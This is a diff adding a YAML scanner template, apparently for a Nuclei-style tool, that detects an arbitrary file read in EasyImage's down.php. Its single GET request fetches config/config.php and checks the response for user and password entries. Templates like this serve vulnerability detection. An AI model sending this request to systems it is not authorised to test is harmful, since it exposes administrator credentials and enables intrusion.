@@ -1,0 +1,28 @@
+id: easyimage-downphp-lfi
+name: EasyImage down.php - Arbitrary File Read
+severity: high
+confidence: confirmed
+description: down.php file in EasyImage is vulnerable to arbitrary file read.
+reference: https://github.com/qingchenhh/qc_poc/blob/main/Goby/EasyImage_down.php_file_read.go
+tags:
+- easyimage
+- lfi
+- exposure
+- config
+- vuln
+requests:
+- method: GET
+  path: /application/down.php?dw=config/config.php
+  matchers:
+  - type: body
+    words:
+    - '''user''=>'
+    - '''password''=>'
+    - EasyImage
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
